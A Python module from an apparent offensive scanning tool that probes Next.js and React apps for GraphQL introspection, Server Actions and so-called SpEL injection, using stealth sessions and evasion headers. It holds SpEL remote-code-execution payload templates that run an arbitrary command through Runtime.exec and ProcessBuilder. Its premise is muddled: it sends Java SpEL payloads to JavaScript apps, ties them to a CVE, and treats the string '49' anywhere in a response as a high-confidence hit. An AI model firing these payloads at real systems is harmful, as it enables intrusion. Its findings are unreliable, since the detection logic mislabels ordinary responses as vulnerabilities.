"""
React2Shell scanner — SpEL/GraphQL injection in Next.js and React-based apps.

Targets:
- __NEXT_DATA__ script tag (discovers internal API routes)
- Next.js Server Actions (Next-Action header detection)
- GraphQL endpoints (/graphql, /api/graphql, /__graphql)
- React Server Components (RSC) injection via ?_rsc= param
- GraphQL introspection leakage detection
"""

from __future__ import annotations

import json
import logging
import re
import time
import urllib.parse
from typing import TYPE_CHECKING, Any

from spring2shell.core.reporter import build_finding
from spring2shell.core.session import create_stealth_session
from spring2shell.evasion.headers import get_random_headers
from spring2shell.utils.auth import apply_auth, audit_log, rate_limit_acquire
from spring2shell.utils.logging import log_event, log_swallowed_exception
from spring2shell.utils.signals import is_interrupted

if TYPE_CHECKING:
    import requests

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

_GRAPHQL_ENDPOINTS = [
    "/graphql",
    "/api/graphql",
    "/v1/graphql",
    "/v2/graphql",
    "/__graphql",
    "/graphql/v1",
    "/query",
    "/api/query",
    "/gql",
    "/api/gql",
]

_NEXTJS_API_PREFIXES = ["/api/", "/app/api/", "/_next/"]

_SPEL_PROBES = [
    # Arithmetic probe — safe, returns 49 on SpEL evaluation
    '{"query": "{{7*7}}"}',
    '{"query": "${7*7}"}',
]

_SPEL_RCE_TEMPLATES = [
    '{"query": "{{T(java.lang.Runtime).getRuntime().exec(\\"COMMAND\\")}}"}',
    '{"query": "{{new java.lang.ProcessBuilder(\\"COMMAND\\").start()}}"}',
]

_GRAPHQL_INTROSPECTION = '{"query": "{__schema{types{name}}}"}'

_RSC_INDICATOR = "__RSC_PAYLOAD"
_NEXT_DATA_RE = re.compile(r'<script[^>]+id="__NEXT_DATA__"[^>]*>(.*?)</script>', re.DOTALL)

# Markers that indicate successful SpEL evaluation
_SPEL_EVAL_INDICATORS = [
    "49",
    "java.lang.",
    "RuntimeException",
    "ProcessBuilder",
    "org.springframework",
]


# ---------------------------------------------------------------------------
# Helper functions
# ---------------------------------------------------------------------------


def _extract_next_data_routes(html: str, base_url: str) -> list[str]:
    """Parse __NEXT_DATA__ JSON to discover internal API routes."""
    match = _NEXT_DATA_RE.search(html)
    if not match:
        return []
    try:
        data = json.loads(match.group(1))
        routes: list[str] = []
        # Extract page route
        page = data.get("page", "")
        if page and not page.startswith("/_"):
            routes.append(page)
        # Extract props.pageProps if any API references exist
        page_props = data.get("props", {}).get("pageProps", {})
        if isinstance(page_props, dict):
            for _key, val in page_props.items():
                if isinstance(val, str) and val.startswith("/api/"):
                    routes.append(val)
        return routes
    except (json.JSONDecodeError, KeyError):
        return []


def _detect_graphql_introspection(
    session: requests.Session, base_url: str, endpoint: str, headers: dict[str, str]
) -> bool:
    """Return True if GraphQL introspection is enabled (schema leaked)."""
    url = urllib.parse.urljoin(base_url.rstrip("/") + "/", endpoint.lstrip("/"))
    try:
        resp = session.post(
            url,
            data=_GRAPHQL_INTROSPECTION,
            headers={**headers, "Content-Type": "application/json"},
            timeout=6,
        )
        if resp.status_code == 200 and "__Schema" in resp.text:
            log_event(logging.WARNING, "GraphQL introspection ENABLED", url=url)
            return True
    except Exception as exc:
        log_swallowed_exception(f"graphql-introspection {url}", exc)
    return False


def _detect_server_actions(
    session: requests.Session, base_url: str, endpoints: list[str], headers: dict[str, str]
) -> list[str]:
    """Detect Next.js Server Action endpoints via Next-Action response header."""
    action_endpoints: list[str] = []
    for ep in endpoints:
        url = urllib.parse.urljoin(base_url.rstrip("/") + "/", ep.lstrip("/"))
        try:
            resp = session.post(
                url,
                data='{"0":"test"}',
                headers={**headers, "Next-Action": "test", "Content-Type": "text/plain"},
                timeout=5,
            )
            if "Next-Action" in resp.headers or resp.status_code in (400, 404):
                # A 400/404 on Next-Action POST often means SA routing is active
                if "Next-Action" in resp.headers:
                    action_endpoints.append(ep)
                    log_event(logging.INFO, "Server Action endpoint detected", url=url)
        except Exception as exc:
            log_swallowed_exception(f"server-action probe {url}", exc)
    return action_endpoints


# ---------------------------------------------------------------------------
# Main scanner
# ---------------------------------------------------------------------------


def scan_react2shell(target_url: str) -> list[dict[str, Any]]:
    """Scan a Next.js / React app for SpEL/GraphQL injection vulnerabilities.

    Steps:
    1. Parse __NEXT_DATA__ to discover API routes
    2. Detect GraphQL introspection leakage
    3. Probe for Next.js Server Actions
    4. Test SpEL probes on all discovered endpoints
    5. Return findings

    Args:
        target_url: Base URL of the React/Next.js application.

    Returns:
        List of finding dicts.
    """
    log_event(logging.INFO, "react2shell-scan start", target=target_url)
    findings: list[dict[str, Any]] = []
    session = create_stealth_session()
    apply_auth(session)
    headers = get_random_headers()

    # ── Step 1: fetch home page, parse __NEXT_DATA__ ─────────────────────────
    discovered_routes: list[str] = []
    is_nextjs = False
    try:
        rate_limit_acquire()
        resp = session.get(target_url, headers=headers, timeout=8)
        audit_log("GET", target_url, resp.status_code, None, "react2shell_probe")

        html = resp.text
        is_nextjs = (
            "__NEXT_DATA__" in html
            or "/_next/" in html
            or resp.headers.get("x-powered-by", "").lower().startswith("next")
        )

        if is_nextjs:
            log_event(logging.INFO, "Next.js detected", target=target_url)
            discovered_routes = _extract_next_data_routes(html, target_url)
            log_event(logging.INFO, f"__NEXT_DATA__ routes: {discovered_routes}")

        # Check for React RSC
        if _RSC_INDICATOR in html or "?_rsc=" in html:
            log_event(logging.INFO, "React Server Components (RSC) detected", target=target_url)
    except Exception as exc:
        log_swallowed_exception(f"react2shell home fetch {target_url}", exc)

    # ── Step 2: Build endpoint list ──────────────────────────────────────────
    endpoints_to_test = list(_GRAPHQL_ENDPOINTS)
    if is_nextjs:
        endpoints_to_test += ["/api/auth", "/api/user", "/api/session", "/api/data", "/api/hello", *discovered_routes]
    endpoints_to_test = list(dict.fromkeys(endpoints_to_test))  # deduplicate

    # ── Step 3: GraphQL introspection check ──────────────────────────────────
    for gql_ep in _GRAPHQL_ENDPOINTS:
        if is_interrupted():
            break
        rate_limit_acquire()
        if _detect_graphql_introspection(session, target_url, gql_ep, headers):
            findings.append(
                build_finding(
                    url=target_url,
                    endpoint=urllib.parse.urljoin(target_url.rstrip("/") + "/", gql_ep.lstrip("/")),
                    status="unverified",
                    confidence="medium",
                    reason="GRAPHQL_INTROSPECTION_ENABLED",
                    evidence="GraphQL __Schema leaked via introspection query — information disclosure",
                    method="POST",
                )
            )

    # ── Step 4: Server Action detection ──────────────────────────────────────
    if is_nextjs:
        sa_eps = _detect_server_actions(session, target_url, endpoints_to_test[:10], headers)
        for ep in sa_eps:
            findings.append(
                build_finding(
                    url=target_url,
                    endpoint=urllib.parse.urljoin(target_url.rstrip("/") + "/", ep.lstrip("/")),
                    status="unverified",
                    confidence="low",
                    reason="NEXT_SERVER_ACTION_DETECTED",
                    evidence="Next.js Server Action endpoint detected (potential SpEL injection surface)",
                    method="POST",
                )
            )

    # ── Step 5: SpEL probe on all endpoints ──────────────────────────────────
    for ep in endpoints_to_test:
        if is_interrupted():
            break
        full_url = urllib.parse.urljoin(target_url.rstrip("/") + "/", ep.lstrip("/"))

        for probe in _SPEL_PROBES:
            rate_limit_acquire()
            try:
                resp = session.post(
                    full_url,
                    data=probe,
                    headers={**headers, "Content-Type": "application/json"},
                    timeout=8,
                )
                audit_log("POST", full_url, resp.status_code, probe, "spel_probe")

                if resp.status_code in (200, 400, 500):
                    for indicator in _SPEL_EVAL_INDICATORS:
                        if indicator in resp.text:
                            findings.append(
                                build_finding(
                                    url=target_url,
                                    endpoint=full_url,
                                    status="unverified",
                                    confidence="high",
                                    cve="CVE-2025-55182",
                                    reason="REACT2SHELL_SPEL_PROBE",
                                    evidence=f"SpEL probe indicator '{indicator}' in response to {probe[:60]}",
                                    payload=probe,
                                    method="POST",
                                    status_code=resp.status_code,
                                    framework="Next.js/React" if is_nextjs else "React",
                                )
                            )
                            log_event(
                                logging.WARNING,
                                "React2Shell SpEL candidate",
                                url=full_url,
                                indicator=indicator,
                            )
                            break
            except Exception as exc:
                log_swallowed_exception(f"react2shell spel-probe {full_url}", exc)

            time.sleep(0.2)

    log_event(logging.INFO, "react2shell-scan complete", findings=len(findings))
    return findings
